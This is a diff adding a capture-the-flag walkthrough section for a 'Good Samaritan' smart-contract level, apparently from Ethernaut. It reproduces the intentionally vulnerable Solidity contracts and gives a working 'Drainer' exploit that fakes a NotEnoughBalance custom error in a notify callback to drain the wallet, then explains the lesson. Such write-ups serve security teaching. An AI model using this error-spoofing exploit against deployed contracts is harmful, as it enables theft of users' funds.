@@ -2843,3 +2843,173 @@ Register it and we are done :)
 ### Learning
 
 >Having tokens that present a double entry point is a non-trivial pattern that might affect many protocols. This is because it is commonly assumed to have one contract per token. But it was not the case this time :) You can read the entire details of what happened [here](https://blog.openzeppelin.com/compound-tusd-integration-issue-retrospective).
+
+## Level 27: Good Samaritan <a name="level-27-good-samaritan">
+
+Let's have a look at the contract first:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.8.0 <0.9.0;
+
+import "openzeppelin-contracts-08/utils/Address.sol";
+
+contract GoodSamaritan {
+    Wallet public wallet;
+    Coin public coin;
+
+    constructor() {
+        wallet = new Wallet();
+        coin = new Coin(address(wallet));
+
+        wallet.setCoin(coin);
+    }
+
+    function requestDonation() external returns (bool enoughBalance) {
+        // donate 10 coins to requester
+        try wallet.donate10(msg.sender) {
+            return true;
+        } catch (bytes memory err) {
+            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
+                // send the coins left
+                wallet.transferRemainder(msg.sender);
+                return false;
+            }
+        }
+    }
+}
+
+contract Coin {
+    using Address for address;
+
+    mapping(address => uint256) public balances;
+
+    error InsufficientBalance(uint256 current, uint256 required);
+
+    constructor(address wallet_) {
+        // one million coins for Good Samaritan initially
+        balances[wallet_] = 10 ** 6;
+    }
+
+    function transfer(address dest_, uint256 amount_) external {
+        uint256 currentBalance = balances[msg.sender];
+
+        // transfer only occurs if balance is enough
+        if (amount_ <= currentBalance) {
+            balances[msg.sender] -= amount_;
+            balances[dest_] += amount_;
+
+            if (dest_.isContract()) {
+                // notify contract
+                INotifyable(dest_).notify(amount_);
+            }
+        } else {
+            revert InsufficientBalance(currentBalance, amount_);
+        }
+    }
+}
+
+contract Wallet {
+    // The owner of the wallet instance
+    address public owner;
+
+    Coin public coin;
+
+    error OnlyOwner();
+    error NotEnoughBalance();
+
+    modifier onlyOwner() {
+        if (msg.sender != owner) {
+            revert OnlyOwner();
+        }
+        _;
+    }
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function donate10(address dest_) external onlyOwner {
+        // check balance left
+        if (coin.balances(address(this)) < 10) {
+            revert NotEnoughBalance();
+        } else {
+            // donate 10 coins
+            coin.transfer(dest_, 10);
+        }
+    }
+
+    function transferRemainder(address dest_) external onlyOwner {
+        // transfer balance left
+        coin.transfer(dest_, coin.balances(address(this)));
+    }
+
+    function setCoin(Coin coin_) external onlyOwner {
+        coin = coin_;
+    }
+}
+
+interface INotifyable {
+    function notify(uint256 amount) external;
+}
+```
+
+Our objective is to drain the balance of the good samarithan contract.
+
+let's first have a look how the contract works. We are able to request a donation
+from the GoodSamaritan contract. What it does is to call the `donate10` function
+of the Wallet contract. The Wallet contract checks if it has enough balance to
+donate 10 coins. If it has, it donates 10 coins to the requester. If it doesn't
+have enough balance, it reverts with a `NotEnoughBalance` error, triggering the
+catch block in the `requestDonation` function of the GoodSamaritan contract,
+which transfers the remaining balance to the requester.
+
+Let's say, the GoodSamaritan contract has more than 10 coins, in that case
+the Wallet contract calls the `transfer` function of the Coin contract, which
+transfers 10 coins to the requester. During the transfer it also checks if the
+destination address is a contract. If it is, it calls the `notify` function of
+the contract.
+
+Well, what to say, that's our way in.
+
+You might ask - why? Custom errors in Solidity are carried up the call chain until
+they are caught by a catch statement. All we have to do is to create a contract,
+which reverts with a `NotEnoughBalance` error in the `notify` function call if 
+`amount <= 10`, which get's caught by the catch statement in the `requestDonation`
+function of the GoodSamaritan contract, and therefore transfers the remaining
+balance to the requester.
+
+Here is the contract:
+
+```solidity
+interface GoodSamaritan {
+    function requestDonation() external returns (bool enoughBalance);
+}
+
+
+contract Drainer {
+    error NotEnoughBalance();
+
+    function drain(address _samaritan) external {
+        GoodSamaritan(_samaritan).requestDonation();
+    }
+
+    function notify(uint256 amount) public pure {
+        if (amount <= 10) {
+            revert NotEnoughBalance();
+        }
+    }
+}
+```
+
+Deploy and provide the address of the GoodSamaritan contract and we are done :)
+
+### Learning
+
+>Custom errors in Solidity are identified by their 4-byte ‘selector’, the same as a function call.
+>They are bubbled up through the call chain until they are caught by a catch statement
+>in a try-catch block, as seen in the GoodSamaritan's requestDonation() function.
+>For these reasons, it is not safe to assume that the error was thrown by the
+>immediate target of the contract call (i.e., Wallet in this case). Any other
+>contract further down in the call chain can declare the same error and throw it
+>at an unexpected location, such as in the notify(uint256 amount) function in your attacker contract.
